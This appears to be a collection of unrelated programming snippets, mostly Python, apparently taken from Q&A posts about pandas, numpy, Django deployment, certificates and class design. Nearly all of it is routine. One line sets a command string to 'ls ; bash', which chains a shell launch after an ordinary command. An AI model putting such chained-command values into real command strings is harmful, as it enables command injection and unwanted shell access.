"import pandas as pd df = pd.DataFrame ( { ' a ' : [ 1 , 2 , 3 , 4 , 5 ] } , index= [ pd.Timestamp ( '20180101 ' ) , pd.Timestamp ( '20180102 ' ) , pd.Timestamp ( '20180103 ' ) , pd.Timestamp ( '20180105 ' ) , pd.Timestamp ( '20180106 ' ) ] ) row0 : Nonerow1 : [ ( 1 , 2 ) ] row2 : [ ( 1 , 2 ) , ( 1 , 3 ) , ( 2 , 3 ) ] row4 : [ ( 3 , 4 ) ] row5 : [ ( 4 , 5 ) ] import itertools as itcombos = it.combinations ( df [ ' a ' ] , 2 ) for c in combos : print ( c ) # ( 1 , 2 ) # ( 1 , 3 ) # ( 1 , 4 ) # ( 1 , 5 ) # etc . df.rolling ( '3d ' ) .sum ( ) # get [ 1 , 3 , 6 , 7 , 9 ] which we expect df.rolling ( '3d ' ) .apply ( lambda x : it.combinations ( x , 2 ) ) it.combinations ( df.rolling ( '3d ' ) , 2 ) it.combinations ( df.rolling ( '3d ' ) [ ' a ' ] , 2 )"
"def ridgeRegression ( xMatrix , yVector , lambdaRange ) : wList = [ ] for i in range ( 1 , lambdaRange+1 ) : lambVal = i # compute the inner values ( X.T X + lambda I ) xTranspose = np.transpose ( x ) xTx = xTranspose @ x lamb_I = lambVal * np.eye ( xTx.shape [ 0 ] ) # invert inner , e.g . ( inner ) ** ( -1 ) inner_matInv = np.linalg.inv ( xTx + lamb_I ) # compute outer ( X.T y ) outer_xTy = np.dot ( xTranspose , y ) # multiply together w = inner_matInv @ outer_xTy wList.append ( w ) print ( wList ) array ( [ 0.29686755 , 1.48420319 , 0.36388528 , 0.70324668 , -0.51604451 , 2.39045735 , 1.45295857 , 2.21437745 , 0.98222546 , 0.86124358 ] )"
"def decorate_class ( klass ) : new_class = type ( klass.__name__ + 'Dec ' , ( klass , ) , { } ) return new_class class Base ( object ) : def __init__ ( self ) : print 'Base init ' @ decorate_classclass MyClass ( Base ) : def __init__ ( self ) : print 'MyClass init ' super ( MyClass , self ) .__init__ ( ) c = MyClass ( ) # ... # File `` test.py '' , line 40 , in __init__ # super ( MyClass , self ) .__init__ ( ) # RuntimeError : maximum recursion depth exceeded while calling a Python object"
"value = np.array ( [ [ 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1 . ] , [ 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1 . ] , [ 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1 . ] , [ 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1 . ] , [ 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1 . ] , [ 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1 . ] , [ 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 2. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1 . ] , [ 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1 . ] , [ 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 2. , 2. , 2. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1 . ] , [ 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 2. , 1. , 2. , 2. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1 . ] , [ 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 2. , 1. , 2. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1 . ] , [ 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1 . ] , [ 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1 . ] , [ 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1 . ] , [ 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1 . ] , [ 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1 . ] , [ 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1 . ] , [ 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1 . ] , [ 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1 . ] , [ 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1 . ] , [ 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1. , 1 . ] ] ) xx , yy = np.linspace ( 0,26,25 ) , np.linspace ( 0,22,22 ) xx , yy = np.meshgrid ( xx , yy ) plt.pcolormesh ( xx , yy , value , facecolor='none ' , edgecolor= ' b ' , alpha=0.8 , zorder=2 )"
"l = [ 1,2,3 ] l = l + ( 4,5 ) # TypeError : can only concatenate list ( not `` tuple '' ) to list l = [ 1,2,3 ] l += `` he '' # Here , l becomes [ 1 , 2 , 3 , '' h '' , `` e '' ] l += ( 56 , 67 ) # Here , l becomes [ 1 , 2 , 3 , '' h '' , `` e '' , 56 , 67 ]"
"# ask.py , just asks something without printing anything if a condition is met # here , we 'll say that the condition is always metinput ( ) p = subprocess.Popen ( [ `` python '' , '' ask.py '' ] , ... )"
"import urllib2xkcdpic=urllib2.urlopen ( `` http : //imgs.xkcd.com/comics/literally.png '' ) xkcdpicfile=open ( `` C : \\Documents and Settings\\John Gann\\Desktop\\xkcd.png '' , '' w '' ) while 1 : chunk=xkcdpic.read ( 4028 ) if chunk : print chunk xkcdpicfile.write ( chunk ) else : break"
"os.path.join ( os.path.dirname ( __file__ ) , file_path ) def filepath_in_cwd ( file_path ) : return os.path.join ( os.path.dirname ( __file__ ) , file_path ) def filepath_in_cwd ( py_file_name , file_path ) : return os.path.join ( os.path.dirname ( py_file_name ) , file_path ) filepath_in_cwd ( __file__ , `` my_file.txt '' )"
"t ( combn ( 5,2 ) ) [ ,1 ] [ ,2 ] [ 1 , ] 1 2 [ 2 , ] 1 3 [ 3 , ] 1 4 [ 4 , ] 1 5 [ 5 , ] 2 3 [ 6 , ] 2 4 [ 7 , ] 2 5 [ 8 , ] 3 4 [ 9 , ] 3 5 [ 10 , ] 4 5"
__ . *__ h [ 2 ] > > > Q.Q.ALL ( Q.__delattr__ ( Q.__getattribute__ ( Q.__package__ Q.__sizeof__ ( Q.find_values ( Q.jsonQ.DEFAULT_CONDITION ( Q.__dict__ Q.__hash__ ( Q.__reduce__ ( Q.__str__ ( Q.get_loops_total_platform ( Q.jsonlibQ.SUCCESSFUL ( Q.__doc__ Q.__init__ ( Q.__reduce_ex__ ( Q.__subclasshook__ ( Q.get_platforms ( Q.memoize ( Q.__all__ Q.__file__ Q.__name__ Q.__repr__ ( Q.cached_open ( Q.get_snippets ( Q.__class__ ( Q.__format__ ( Q.__new__ ( Q.__setattr__ ( Q.find_results ( Q.get_subjects ( h [ 2 ] > > > Q. h [ 2 ] > > > Q.Q.ALL ( Q.find_values ( Q.jsonQ.DEFAULT_CONDITION ( Q.get_loops_total_platform ( Q.jsonlib Q.SUCCESSFUL ( Q.get_platforms ( Q.memoize ( Q.cached_open ( Q.get_snippets ( Q.find_results ( Q.get_subjects ( h [ 2 ] > > > Q .
"class Blog ( serializers.HyperlinkedModelSerializer ) : class Meta : model = Blog fields = ( 'url ' , 'id ' ) class Comment ( serializers.HyperlinkedModelSerializer ) : blog = serializers.HyperlinkedRelatedField ( view_name='blog-detail ' , queryset=Blog.objects.all ( ) ) class Meta : model = Comment fields = ( 'url ' , 'text ' , 'blog ' ) { 'url ' : 'mysite.fake/comments/1 ' , 'text ' : 'test text ' , 'blog ' : 'mysite.fake/blog/1 ' } { 'text ' : 'test text ' , 'blog ' : 'mysite.fake/blog/1 ' } { 'text ' : 'test text ' , 'blog ' : ' 1 ' }"
"from setuptools import setupsetup ( ... provides= [ `` trytond ( 2.8.2 ) '' ] , ... ) from setuptools import setupsetup ( ... install_requires= [ `` trytond > =2.8 '' ] ... )"
id date company ... ... 123 2019-01-01 A224 2019-01-01 B345 2019-01-01 B987 2019-01-03 C334 2019-01-03 C908 2019-01-04 C765 2019-01-04 A554 2019-01-05 A482 2019-01-05 D date cumulative_count2019-01-01 22019-01-03 32019-01-04 32019-01-05 4 df.groupby ( [ 'date ' ] ) .company.nunique ( ) .cumsum ( )
"> > > import nltk > > > nltk.download ( ) > > > from nltk.book import **** Introductory Examples for the NLTK Book ***Loading text1 , ... , text9 and sent1 , ... , sent9Type the name of the text or sentence to view it.Type : 'texts ( ) ' or 'sents ( ) ' to list the materials.text1 : Moby Dick by Herman Melville 1851text2 : Sense and Sensibility by Jane Austen 1811 > > > text1.concordance ( `` monstrous '' )"
"def concordance_computer ( Y , S ) : N_C = 0 N_D = 0 N_T_y = 0 N_T_x = 0 for i in range ( 0 , len ( S ) ) : for j in range ( i+1 , len ( Y ) ) : Y1 = Y [ i ] X1 = S [ i ] Y2 = Y [ j ] X2 = S [ j ] if Y1 > Y2 and X1 > X2 : N_C += 1 elif Y1 < Y2 and X1 < X2 : N_C += 1 elif Y1 > Y2 and X1 < X2 : N_D += 1 elif Y1 < Y2 and X1 > X2 : N_D += 1 elif Y1 == Y2 : N_T_y += 1 elif X1 == X2 : N_T_x += 1 N_tot = len ( S ) * ( len ( S ) -1 ) / 2 SomersD = ( N_C - N_D ) / ( N_tot - N_T_y ) return SomersD merge [ ' Y ' ] = Ymerge [ 'S ' ] = Szeros2 = merge.loc [ merge [ ' Y ' ] == 0 ] ones2 = merge.loc [ merge [ ' Y ' ] == 1 ] from bisect import bisect_left , bisect_rightdef bin_conc ( zeros2 , ones2 ) : zeros2_list = sorted ( [ zeros2.iloc [ j , 1 ] for j in range ( len ( zeros2 ) ) ] ) zeros2_length = len ( zeros2_list ) conc = disc = ties = 0 for i in range ( len ( ones2 ) ) : cur_conc = bisect_left ( zeros2_list , ones2.iloc [ i , 1 ] ) cur_ties = bisect_right ( zeros2_list , ones2.iloc [ i , 1 ] ) - cur_conc conc += cur_conc ties += cur_ties disc += zeros2_length - cur_ties - cur_conc pairs_tested = zeros2_length * len ( ones2.index ) return conc , disc , ties , pairs_tested"
"temp = numpy.zeros ( ( len ( data ) / 3 , 4 ) , dtype= ' b ' ) temp [ : , 1 : ] = numpy.frombuffer ( data , dtype= ' b ' ) .reshape ( -1 , 3 ) temp2 = temp.view ( ' < i4 ' ) .flatten ( ) > > 16 # > > 16 because I need to divide by 2**16 to load my data into 16-bit array , needed for my ( audio ) applicationoutput = temp2.astype ( 'int16 ' )"
"> > > from scipy import sparse > > > from numpy import array > > > I = array ( [ 0,0,0,0 ] ) > > > J = array ( [ 0,1,2,3 ] ) > > > V = array ( [ 1,1,1,1 ] ) > > > incr_matrix = sparse.coo_matrix ( ( V , ( I , J ) ) , shape= ( 100,100 ) ) > > > main_matrix += incr_matrix # where main_matrix was previously defined"
P ( w|c ) P ( c )
print `` '' '' Anything I type in here works . Multiple LINES woohoo ! '' '' '' `` `` '' This is my python Script . Just this much `` '' '' `` This is my Python Script . Just this . Even with single quotes . ''
"df = pd.DataFrame ( [ [ 1,2 ] , [ 3,4 ] ] ) dic = { 0 : 'first ' , 1 : 'second ' } 0 1first 1 2second 3 4"
"docker pull ubuntudocker run -i -t ubuntu /bin/bash $ python3.4 -m timeit ' '' - '' .join ( str ( n ) for n in range ( 100 ) ) '10000 loops , best of 3 : 37.7 usec per loop $ python3.4 -m timeit ' '' - '' .join ( [ str ( n ) for n in range ( 100 ) ] ) '10000 loops , best of 3 : 34.2 usec per loop $ python3.4 -m timeit ' '' - '' .join ( map ( str , range ( 100 ) ) ) '10000 loops , best of 3 : 26.2 usec per loop > python3 -m timeit ' '' - '' .join ( str ( n ) for n in range ( 100 ) ) '10000 loops , best of 3 : 30 usec per loop > python3 -m timeit ' '' - '' .join ( [ str ( n ) for n in range ( 100 ) ] ) '10000 loops , best of 3 : 26.9 usec per loop > python3 -m timeit ' '' - '' .join ( map ( str , range ( 100 ) ) ) '10000 loops , best of 3 : 20.2 usec per loop python3 -c 'import sys ; print ( `` % x '' % sys.maxsize , sys.maxsize > 2**32 ) '7fffffffffffffff True python3.4 -c 'import sys ; print ( `` % x '' % sys.maxsize , sys.maxsize > 2**32 ) '7fffffffffffffff True"
"certificates = pem.parse_file ( `` chain.pem '' ) store = crypto.X509Store ( ) for cert in certificates [ : -1 ] : loaded_cert = crypto.load_certificate ( crypto.FILETYPE_PEM , cert.as_bytes ( ) ) store.add_cert ( loaded_cert ) intermediate_cert = crypto.load_certificate ( crypto.FILETYPE_PEM , certificates [ -1 ] .as_bytes ( ) ) # Create a certificate contextstore_ctx = crypto.X509StoreContext ( store , intermediate_cert ) # Verify the certificatestore_ctx.verify_certificate ( ) OpenSSL.crypto.X509StoreContextError : [ 20 , 0 , 'unable to get local issuer certificate ' ]"
"def respond ( err , res=None ) : return { 'statusCode ' : 400 if err else 200 , 'body ' : json.dumps ( err ) if err else json.dumps ( res ) , 'headers ' : { 'Access-Control-Allow-Headers ' : 'content-type , X-Amz-Date , Authorization , X-Api-Key , X-Amz-Security-Token ' , 'Access-Control-Allow-Methods ' : 'POST , GET , DELETE ' , 'Access-Control-Allow-Origin ' : '* ' , 'Access-Control-Allow-Credentials ' : True , 'Content-Type ' : 'application/json ' , } , } Execution log for request test-requestWed Jul 05 14:25:26 UTC 2017 : Starting execution for request : test-invoke-requestWed Jul 05 14:25:26 UTC 2017 : HTTP Method : OPTIONS , Resource Path : /loginWed Jul 05 14:25:26 UTC 2017 : Method request path : { } Wed Jul 05 14:25:26 UTC 2017 : Method request query string : { } Wed Jul 05 14:25:26 UTC 2017 : Method request headers : { } Wed Jul 05 14:25:26 UTC 2017 : Method request body before transformations : Wed Jul 05 14:25:26 UTC 2017 : Received response . Integration latency : 0 msWed Jul 05 14:25:26 UTC 2017 : Endpoint response body before transformations : Wed Jul 05 14:25:26 UTC 2017 : Endpoint response headers : { } Wed Jul 05 14:25:26 UTC 2017 : Execution failed due to configuration error : Output mapping refers to an invalid method response : 200Wed Jul 05 14:25:26 UTC 2017 : Method completed with status : 500"
x = x + 1 x += 1 x = x and y
PCollection < String > userActionsJson = userActionsRaw.apply ( ParDo.of ( new BigQueryRowToJson ( ) ) ) ; String topicNameFull = `` projects/ '' + options.getProject ( ) + `` /topics/ '' + options.getUsersActionsTopicName ( ) + `` - '' + options.getProduct ( ) ; userActionsJson.apply ( PubsubIO.Write.named ( `` PublishToPubSub '' ) .topic ( topicNameFull ) ) ;
command = `` ls ; bash ''
import pytz b=pytz.timezone ( 'Europe/Rome ' ) c=pytz.timezone ( 'Europe/Berlin ' )
"import numpy as np from astropy.io import fits a1 = np.array ( [ 1,2,4,8 ] ) a2 = np.array ( [ 0,1,2,3 ] ) hdulist = fits.BinTableHDU.from_columns ( [ fits.Column ( name='FIRST ' , format= ' E ' , array=a1 ) , fits.Column ( name='SECOND ' , format= ' E ' , array=a2 ) ] ) hdulist.writeto ( 'file.fits ' ) type object 'BinTableHDU ' has no attribute 'from_columns '"
"from sympy.core.symbol import symbolsfrom sympy.solvers.solveset import nonlinsolvex , y , z = symbols ( ' x , y , z ' , real=True ) nonlinsolve ( [ x*y - 1 , 4*x**2 + y**2 - 5 ] , [ x , y ] ) { ( -1 , -1 ) , ( -1/2 , -2 ) , ( 1/2 , 2 ) , ( 1 , 1 ) } > > > from sympy.solvers.solveset import nonlinsolveTraceback ( most recent call last ) : File `` < string > '' , line 1 , in < module > ImportError : can not import name nonlinsolve"
"import MySQLdb as mdbdef insert_func ( ) : with con : cur = con.cursor ( mdb.cursors.DictCursor ) cur.execute ( `` INSERT INTO table ( col1 , col2 , col3 ) VALUES ( % s , % s , % s ) '' , ( val1 , val2 , val3 ) ) rows = cur.fetchall ( ) # do something with the resultsreturn someval"
-- -- -- -- -- -- -- -| col1 | col2 | -- -- -- -- -- -- -- -| a | b || c | d || b | e | -- -- -- -- -- -- -- - -- -- -- -- -- -- -- -- -- -- -| a | b | c | d | e | -- -- -- -- -- -- -- -- -- -- -| 1 | 1 | 0 | 0 | 0 || 0 | 0 | 1 | 1 | 0 || 0 | 1 | 0 | 0 | 1 | -- -- -- -- -- -- -- -- -- -- - -- -- -- -- -- -- -- -- -- -- -| col1 | col2 | val | -- -- -- -- -- -- -- -- -- -- -| a | b | .5 || c | d | .3 || b | e | .2 | -- -- -- -- -- -- -- -- -- -- - -- -- -- -- -- -- -- -- -- -- -- -- -- -| a | b | c | d | e | val | -- -- -- -- -- -- -- -- -- -- -- -- -- -| 1 | 1 | 0 | 0 | 0 | .5 || 0 | 0 | 1 | 1 | 0 | .3 || 0 | 1 | 0 | 0 | 1 | .2 | -- -- -- -- -- -- -- -- -- -- -- -- -- -
"a = [ 1 ,2 ] b = [ 1 , 3 ] c = [ 1 , 4 ] d = [ 2 , 5 ] False in [ True if 1 in l else False for l in [ a , b , c , d ] ]"
"125:126 , 126:126 , 127:128 , 128:128 a = { 125:126 , 126:126 , 127:128 , 128:128 } u , indices = numpy.unique ( image , return_inverse=True ) for i in range ( 0 , len ( u ) ) : u [ i ] = a [ u [ i ] ] updatedimage = u [ indices ] updatedimage = numpy.resize ( updatedimage , ( height , width ) ) # Resize to original dims"
"int some_function ( int a ) { return a + 4 ; } ... main_ty = ir.FunctionType ( ir.IntType ( 32 ) , [ ] ) func = ir.Function ( module , main_ty , 'main ' ) block = func.append_basic_block ( 'entry ' ) builder = ir.IRBuilder ( block ) # I want to do something like this ... ret = builder.call ( some_function , [ ir.Constant ( ir.IntType ( 32 ) , 34 ) ] ) ; ..."
"import numpy as npn = 100np.random.seed ( 2 ) A = np.random.rand ( n , n ) global_best = np.inffor i in range ( n-2 ) : for j in range ( i+1 , n-1 ) : for k in range ( j+1 , n ) : # find the maximum of the element-wise minimum of the three vectors local_best = np.amax ( np.array ( [ A [ i , : ] , A [ j , : ] , A [ k , : ] ] ) .min ( 0 ) ) # if local_best is lower than global_best , update global_best if ( local_best < global_best ) : global_best = local_best save_rows = [ i , j , k ] print global_best , save_rows Out [ ] : 0.492652949593 [ 6 , 41 , 58 ]"
"for col in [ ' a ' , ' b ' , ' c ' ] : df.loc [ df [ col ] < 0 , col ] = np.nan"
"End of script output before headers ServerAdmin webmaster @ localhostDocumentRoot /home/artfact/arTfact_webSite/Alias /static /home/artfact/arTfact_webSite/static < Directory /home/artfact/arTfact_webSite/static > Order allow , deny Allow from all Require all granted < /Directory > < Directory /home/artfact/arTfact_webSite > Order allow , deny Allow from all < Files wsgi.py > Require all granted < /Files > < /Directory > WSGIDaemonProcess artfact_site processes=5 threads=25 python-path=/home/artfact/anaconda/lib/python2.7/site-packages/ : /home/artfact/arTfact_webSite WSGIProcessGroup artfact_site WSGIScriptAlias / /home/artfact/arTfact_webSite/arTfact_webSite/wsgi.py `` '' '' Django settings for arTfact_webSite project.Generated by 'django-admin startproject ' using Django 1.8.5.For more information on this file , seehttps : //docs.djangoproject.com/en/1.8/topics/settings/For the full list of settings and their values , seehttps : //docs.djangoproject.com/en/1.8/ref/settings/ '' '' '' # Build paths inside the project like this : os.path.join ( BASE_DIR , ... ) import osBASE_DIR = os.path.dirname ( os.path.dirname ( os.path.abspath ( __file__ ) ) ) # Quick-start development settings - unsuitable for production # See https : //docs.djangoproject.com/en/1.8/howto/deployment/checklist/ # SECURITY WARNING : keep the secret key used in production secret ! SECRET_KEY = xxxx # SECURITY WARNING : do n't run with debug turned on in production ! DEBUG = TrueALLOWED_HOSTS = [ ] # Application definitionINSTALLED_APPS = ( 'django.contrib.admin ' , 'django.contrib.auth ' , 'django.contrib.contenttypes ' , 'django.contrib.sessions ' , 'django.contrib.messages ' , 'django.contrib.staticfiles ' , 'website ' , 'blog ' , ) MIDDLEWARE_CLASSES = ( 'django.contrib.sessions.middleware.SessionMiddleware ' , 'django.middleware.common.CommonMiddleware ' , 'django.middleware.csrf.CsrfViewMiddleware ' , 'django.contrib.auth.middleware.AuthenticationMiddleware ' , 'django.contrib.auth.middleware.SessionAuthenticationMiddleware ' , 'django.contrib.messages.middleware.MessageMiddleware ' , 'django.middleware.clickjacking.XFrameOptionsMiddleware ' , 'django.middleware.security.SecurityMiddleware ' , ) ROOT_URLCONF = 'arTfact_webSite.urls'TEMPLATES = [ { 'BACKEND ' : 'django.template.backends.django.DjangoTemplates ' , 'DIRS ' : [ ] , 'APP_DIRS ' : True , 'OPTIONS ' : { 'context_processors ' : [ 'django.template.context_processors.debug ' , 'django.template.context_processors.request ' , 'django.contrib.auth.context_processors.auth ' , 'django.contrib.messages.context_processors.messages ' , ] , } , } , ] WSGI_APPLICATION = 'arTfact_webSite.wsgi.application ' # Database # https : //docs.djangoproject.com/en/1.8/ref/settings/ # databasesDATABASES = { 'default ' : { 'ENGINE ' : 'django.db.backends.sqlite3 ' , 'NAME ' : os.path.join ( BASE_DIR , 'db.sqlite3 ' ) , } } # Internationalization # https : //docs.djangoproject.com/en/1.8/topics/i18n/LANGUAGE_CODE = 'en-us'TIME_ZONE = 'Europe/Paris'USE_I18N = TrueUSE_L10N = TrueUSE_TZ = True # Static files ( CSS , JavaScript , Images ) # https : //docs.djangoproject.com/en/1.8/howto/static-files/STATIC_URL = '/static/'STATIC_ROOT = os.path.join ( BASE_DIR , 'static ' ) MEDIA_URL = '/media/'MEDIA_ROOT = os.path.join ( BASE_DIR , 'media ' ) `` '' '' WSGI config for arTfact_webSite project.It exposes the WSGI callable as a module-level variable named `` application `` .For more information on this file , seehttps : //docs.djangoproject.com/en/1.8/howto/deployment/wsgi/ '' '' '' from django.core.wsgi import get_wsgi_applicationos.environ.setdefault ( `` DJANGO_SETTINGS_MODULE '' , `` arTfact_webSite.settings '' ) application = get_wsgi_application ( ) arTfact_webSite/├── arTfact_webSite│ ├── __init__.py│ ├── __init__.pyc│ ├── settings.py│ ├── settings.pyc│ ├── urls.py│ ├── urls.pyc│ ├── wsgi.py│ └── wsgi.pyc├── blog├── static├── media└── website ├── admin.py ├── admin.pyc ├── forms.py ├── forms.pyc ├── general_analyser.py ├── general_analyser.pyc ├── __init__.py ├── __init__.pyc ├── migrations │ ├── __init__.py │ └── __init__.pyc ├── models.py ├── models.pyc ├── send_mail.py ├── send_mail.pyc ├── static │ └── website ├── templates │ └── website ├── tests.py ├── tests.pyc ├── urls.py ├── urls.pyc ├── views.py └── views.pyc urlpatterns = [ url ( r'^/* ' , include ( 'website.urls ' ) ) , ] +static ( settings.MEDIA_URL , document_root=settings.MEDIA_ROOT ) urlpatterns = [ url ( r'^ $ ' , views.index , name='index ' ) , ]"
import matplotlibmatplotlib.use ( `` AGG '' ) import matplotlib.pyplot as plt ...
"> > > l = [ 1 , 2 , 3 ] > > > l [ 1 , 2 , 3 ] > > > print l [ 1 , 2 , 3 ] > > > ' { } { } { } '.format ( *l ) ' 1 2 3 ' > > > print *l File `` < stdin > '' , line 1 print *l ^SyntaxError : invalid syntax > > > t = ( 4 , 5 , 6 ) > > > t ( 4 , 5 , 6 ) > > > print t ( 4 , 5 , 6 ) > > > ' % d % d % d ' % t ' 4 5 6 ' > > > ' { } { } { } '.format ( *t ) ' 4 5 6 ' > > > print *t File `` < stdin > '' , line 1 print *t ^SyntaxError : invalid syntax"
"import timedef textinput ( txt , waittime=0.04 ) : end = len ( txt ) letters = 0 while end ! = letters : print ( txt [ letters ] , end = `` ) letters += 1 time.sleep ( waittime ) textinput ( 'Hello there ! ' )"
"x_dims = 3batch_size = 4x = tf.placeholder ( tf.float32 , ( None , x_dims ) ) y = 2* ( x**2 ) grads = tf.gradients ( y , x ) sess = tf.Session ( ) x_val = np.random.randint ( 0 , 10 , ( batch_size , x_dims ) ) y_val , grads_val = sess.run ( [ y , grads ] , { x : x_val } ) print ( ' x = \n ' , x_val ) print ( ' y = \n ' , y_val ) print ( 'dy/dx = \n ' , grads_val [ 0 ] ) x = [ [ 5 3 7 ] [ 2 2 5 ] [ 7 5 0 ] [ 3 7 6 ] ] y = [ [ 50 . 18 . 98 . ] [ 8 . 8 . 50 . ] [ 98 . 50 . 0 . ] [ 18 . 98 . 72 . ] ] dy/dx = [ [ 20 . 12 . 28 . ] [ 8 . 8 . 20 . ] [ 28 . 20 . 0 . ] [ 12 . 28 . 24 . ] ]"
"import multiprocessing , operatorf = operator.itemgetter ( 0 ) # def f ( *a ) : return operator.itemgetter ( 0 ) ( *a ) if __name__ == '__main__ ' : multiprocessing.Pool ( 1 ) .map ( f , [ `` ab '' ] ) Process PoolWorker-1 : Traceback ( most recent call last ) : File `` /usr/lib/python3.2/multiprocessing/process.py '' , line 267 , in _bootstrap self.run ( ) File `` /usr/lib/python3.2/multiprocessing/process.py '' , line 116 , in run self._target ( *self._args , **self._kwargs ) File `` /usr/lib/python3.2/multiprocessing/pool.py '' , line 102 , in worker task = get ( ) File `` /usr/lib/python3.2/multiprocessing/queues.py '' , line 382 , in get return recv ( ) TypeError : itemgetter expected 1 arguments , got 0"
"romaindeterre $ brew install opencv== > Downloading http : //sourceforge.net/projects/opencvlibrary/files/opencv-unix/2.4.3/OpAlready downloaded : /Library/Caches/Homebrew/opencv-2.4.3.tar.bz2== > cmake -DCMAKE_INSTALL_PREFIX=/usr/local/Cellar/opencv/2.4.3 -DCMAKE_BUILD_TYPE=None == > make== > make install== > CaveatsThe OpenCV Python module will not work until you edit your PYTHONPATH like so : export PYTHONPATH= '' /usr/local/lib/python2.7/site-packages : $ PYTHONPATH '' To make this permanent , put it in your shell 's profile ( e.g . ~/.profile ) .== > Summary/usr/local/Cellar/opencv/2.4.3 : 214 files , 51M , built in 108 seconds /Library/Frameworks/Python.framework/Versions/2.7/bin/python-config/Library/Frameworks/Python.framework/Versions/2.7/bin/python2-config/Library/Frameworks/Python.framework/Versions/2.7/bin/python2.7-config"
"AttributeError : Can not overwrite NamedTuple attribute __new__ from collections import namedtupleclass FormatSpec ( namedtuple ( 'FormatSpecBase ' , 'fill align sign alt zero ' 'width comma decimal precision type ' ) ) : __slots__ = ( ) def __new__ ( cls , fill , align , sign , alt , zero , width , comma , decimal , precision , type ) : to_int=lambda x : int ( x ) if x is not None else x zero=to_int ( zero ) width=to_int ( width ) precision=to_int ( precision ) return super ( ) .__new__ ( cls , fill , align , sign , alt , zero , width , comma , decimal , precision , type ) FormatSpec.__doc__=_FormatSpec.__doc__.replace ( 'FormatSpecBase ' , 'FormatSpec ' ) from typing import NamedTuple , Optionalclass FormatSpec ( NamedTuple ) : `` '' '' Represents a string that conforms to the [ Format Specification Mini-Language ] [ 1 ] in the string module . [ 1 ] : https : //docs.python.org/3/library/string.html # formatspec `` '' '' fill : Optional [ str ] align : Optional [ str ] sign : Optional [ str ] alt : Optional [ str ] zero : Optional [ int ] width : Optional [ int ] comma : Optional [ str ] decimal : Optional [ str ] precision : Optional [ int ] type : str def __new__ ( cls , fill , align , sign , alt , zero , width , comma , decimal , precision , type ) : to_int=lambda x : int ( x ) if x is not None else x zero=to_int ( zero ) width=to_int ( width ) precision=to_int ( precision ) return super ( ) .__new__ ( cls , fill , align , sign , alt , zero , width , comma , decimal , precision , type ) def join ( self ) : return `` .join ( ' { ! s } '.format ( s ) for s in self if s is not None ) def __format__ ( self , format_spec ) : try : return format ( self.join ( ) , format_spec ) except ( TypeError , ValueError ) : return super ( ) .__format__ ( format_spec )"
